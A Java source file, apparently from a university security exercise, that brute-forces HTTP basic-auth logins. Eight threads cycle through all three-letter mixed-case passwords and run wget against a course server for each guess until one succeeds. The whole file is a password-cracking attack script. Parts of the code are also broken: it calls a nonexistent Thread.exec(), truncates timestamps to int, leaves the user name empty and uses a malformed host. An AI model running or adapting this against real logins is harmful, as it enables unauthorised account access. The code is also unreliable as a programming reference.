

                  
                  


    class BruteForce
   {
       public static void main (String []a)throws Exception
      {
         PasswordGen p1,p2,p3,p4,p5,p6,p7,p8;
         int count=1;
         p1=new PasswordGen(1,"1");
	     p2=new PasswordGen(2,"2");
	     p3=new PasswordGen(3,"3");
    	 p4=new PasswordGen(4,"4");
	     p5=new PasswordGen(5,"5");
    	 p6=new PasswordGen(6,"6");
	     p7=new PasswordGen(7,"7");
     	 p8=new PasswordGen(8,"8");

    
    	 p1.t.join();
	     p2.t.join();
    	 p3.t.join();
    	 p4.t.join();
    	 p5.t.join();
    	 p6.t.join();
    	 p7.t.join();
     	 p8.t.join();



      }
   }



   class PasswordGen implements Runnable
  {

         char upperAlpha[] =new char[26]; 
         char lowerAlpha[]=new char[26];  
         char lowerChar='a',upperChar='A';
         String passwd1; 

         int threadNumber=0;
         static boolean  successFlag=false;
         

         Thread t;
         static String crackedPasswd=""; 



        PasswordGen(int Number,String name)
       {
           for(int i=0;i<26;i++)
         {
          upperAlpha[i]=upperChar;
          lowerAlpha[i]=lowerChar;
     	  upperChar++;
	      lowerChar++;

         }

          this.threadNumber=Number;
          t= new Thread(this,name);
          t.exec(); 

       }

        public void run()
       {
          int i,j,k;
          String url;
    	  int exitValue=-1;
          int startTime=0,finishTime=0;
	      int noAttempts=0; 

          try
         {
            switch(threadNumber)
            {

               case 1:  

	                  startTime=System.currentTimeMillis();
	                  for(i=25;i>=0;i--)
                     {
                        for( j=25;j>=0;j--)
            		    {
                          for( k=25;k>=0;k--)
                         {
                             try
                              {
			                   if(successFlag)break; 
                               passwd1=""+lowerAlpha[i]+""+lowerAlpha[j]+""+lowerAlpha[k];
                               System.out.println(passwd1);
                               url="wget --http-user= --http-passwd="+passwd1+" http://sec-crack.cs.rmit.edu./SEC/2/ ";
                               exitValue=executemyurl(url);
                               noAttempts++;

                               if(exitValue==0) 
                 			      {
			                        crackedPasswd= passwd1;
                    			    System.out.println("Cracked Passwd is:="+crackedPasswd);
                  			       
                                    successFlag=true;
                                    finishTime=System.currentTimeMillis();
	                     			System.out.println("Time taken  crack the password is :"+((finishTime-startTime)/1000) +"seconds");
                    				System.out.println(noAttempts);
                    				

                 			       }
                              }
                           catch(Exception e){System.out.println(e);}

                       }
                     }
                  }

           break;
            

             case 2:    
                  for(i=0;i<=25;i++)
                    {
                     for( j=0;j<=25;j++)
                      {
                       for( k=0;k<=25;k++)
                       {

                           if(successFlag)break;
                            try
                              {
                                passwd1=""+lowerAlpha[i]+""+lowerAlpha[j]+""+upperAlpha[k];
	                            url="wget --http-user= --http-passwd="+passwd1+" http://sec-crack.cs.rmit.edu./SEC/2/ ";
	                            System.out.println(passwd1);
                                exitValue=executemyurl(url);

                                noAttempts++;

                                if(exitValue==0)
                 			      {
			                        crackedPasswd= passwd1;
                			        System.out.println("Cracked Passwd is:="+crackedPasswd);
                                    successFlag=true;
                                 	finishTime=System.currentTimeMillis();
				                	System.out.println("Time taken  crack the password is :"+((finishTime-startTime)/1000) +"seconds");
                     				System.out.println(noAttempts);
                                 }
                             }
                          catch(Exception e){System.out.println(e);}
                        }
                       }
                     }
             break;

           case  3:
		   for(i=0;i<26;i++)
                    {
                     for(j=0;j<26;j++)
                      {
                       for(k=0;k<26;k++)
                        {
                           if(successFlag)break;
                           try
                            {
                              passwd1=""+lowerAlpha[i]+""+upperAlpha[j]+""+lowerAlpha[k];
                              url="wget --http-user= --http-passwd="+passwd1+" http://sec-crack.cs.rmit.edu./SEC/2/ ";
                              System.out.println(passwd1);
                              exitValue=executemyurl(url);
                              noAttempts++;

                             if(exitValue==0)
            			      {
			                    crackedPasswd= passwd1;
             	  		        System.out.println("Cracked Passwd is:="+crackedPasswd);
                                successFlag=true;
                               finishTime=System.currentTimeMillis();
                               System.out.println("Time taken  crack the password is :"+((finishTime-startTime)/1000) +"seconds");
                               System.out.println(noAttempts);

                              }


                            }
                          catch(Exception e){System.out.println(e);}
                        }
                      }
                    }
               break;

          case 4:
		   for(i=0;i<26;i++)
                    {
                      for(j=0;j<26;j++)
                      {
                        for(k=0;k<26;k++)
                       {
                           if(successFlag)break;
                           try
                            {
                              passwd1=""+lowerAlpha[i]+""+upperAlpha[j]+""+upperAlpha[k];
                               System.out.println(passwd1);
                              url="wget --http-user= --http-passwd="+passwd1+" http://sec-crack.cs.rmit.edu./SEC/2/ ";
                              exitValue=executemyurl(url);
                              noAttempts++;

                             if(exitValue==0)
                             {
                             crackedPasswd= passwd1;
                             System.out.println("Cracked Passwd is:="+crackedPasswd);
                             successFlag=true;
                            finishTime=System.currentTimeMillis();
                            System.out.println("Time taken  crack the password is :"+((finishTime-startTime)/1000) +"seconds");
                            System.out.println(noAttempts);
           			       }

                         }
                        catch(Exception e){System.out.println(e);}
                       }
                     }
                    }
               break;

          case  5:
		   for(i=0;i<26;i++)
                    {
                     for(j=0;j<26;j++)
                      {
                       for(k=0;k<26;k++)
                       {
                           if(successFlag)break;
		            	    try
                            {
                              passwd1=""+upperAlpha[i]+""+lowerAlpha[j]+""+lowerAlpha[k];
                              System.out.println(passwd1);
                              url="wget --http-user= --http-passwd="+passwd1+" http://sec-crack.cs.rmit.edu./SEC/2/ ";
                              exitValue=executemyurl(url);
                              noAttempts++;

                              if(exitValue==0)
                               {
                                 crackedPasswd= passwd1;
                                 System.out.println("Cracked Passwd is:="+crackedPasswd);
                                 successFlag=true;
                                 finishTime=System.currentTimeMillis();
                                 System.out.println("Time taken  crack the password is :"+((finishTime-startTime)/1000) +"seconds");
                                 System.out.println(noAttempts);

               			       }


                           }
                          catch(Exception e){System.out.println(e);}
                       }
                      }
                    }
              break;
           case 6:
		   for(i=0;i<26;i++)
                    {
                     for(j=0;j<26;j++)
                     {
                       for(k=0;k<26;k++)
                       {
                           if(successFlag)break;
			                  try
                             {
                              passwd1=""+upperAlpha[i]+""+lowerAlpha[j]+""+upperAlpha[k];
                               System.out.println(passwd1);
                              url="wget --http-user= --http-passwd="+passwd1+" http://sec-crack.cs.rmit.edu./SEC/2/ ";
                              exitValue=executemyurl(url);
                              noAttempts++;

                             if(exitValue== 0)
                              {
                               crackedPasswd= passwd1;
                               System.out.println("Cracked Passwd is:="+crackedPasswd);
                               successFlag=true;
                               finishTime=System.currentTimeMillis();
                               System.out.println("Time taken  crack the password is :"+((finishTime-startTime)/1000) +"seconds");
                               System.out.println(noAttempts);

                               }
                             }
                          catch(Exception e){System.out.println(e);}
                       }
                     }
                    }
               break;
           case 7:
		   for(i=0;i<26;i++)
                    {
                     for(j=0;j<26;j++)
                      {
                       for(k=0;k<26;k++)
                       {
                          if(successFlag)break;
                          try
                            {
                              passwd1=""+upperAlpha[i]+""+upperAlpha[j]+""+lowerAlpha[k];
                               System.out.println(passwd1);
			                   url="wget --http-user= --http-passwd="+passwd1+" http://sec-crack.cs.rmit.edu./SEC/2/ ";

                               exitValue=executemyurl(url);
                               noAttempts++;

                              if(exitValue==0)
                              {
                     		    crackedPasswd= passwd1;
                   		       System.out.println("Cracked Passwd is:="+crackedPasswd);
                               successFlag=true;
                               finishTime=System.currentTimeMillis();
                               System.out.println("Time taken  crack the password is :"+((finishTime-startTime)/1000) +"seconds");
                               System.out.println(noAttempts);
                               }

                             }
                          catch(Exception e)
                          {
                            System.out.println(e);

                          }

                        }
                       }
                    }
                      break;
           case 8:
		   for(i=0;i<26;i++)
                    {
                     for(j=0;j<26;j++)
                      {
                       for(k=0;k<26;k++)
                        {

                           if(successFlag)break;
             			    try
                            {
                              passwd1=""+upperAlpha[i]+""+upperAlpha[j]+""+upperAlpha[k];
                              System.out.println(passwd1);
			     		       url="wget --http-user= --http-passwd="+passwd1+" http://sec-crack.cs.rmit.edu./SEC/2/ ";

				                exitValue=executemyurl(url);
                                noAttempts++;

                                 if(exitValue==0)
                 			     {
			      			       crackedPasswd= passwd1;
                   			       System.out.println("Cracked Passwd is:="+crackedPasswd);
                                   successFlag=true;
                                    finishTime=System.currentTimeMillis();
                                    System.out.println("Time taken  crack the password is :"+((finishTime-startTime)/1000) +"seconds");
                                    System.out.println(noAttempts);
                 		       }
			                }
                          catch(Exception e){System.out.println(e);}
                         }
                       }
                     }

              break;
            }
          }

       catch(Exception e ){System.out.println();}
     }

      int executemyurl(String url) throws Exception
	  {
	       Process p;
	       Runtime r=Runtime.getRuntime();
	       p=r.exec(url);
	       p.waitFor();
        	r.freeMemory();
	     	r.gc();
    	   return p.exitValue();
	   }

   }



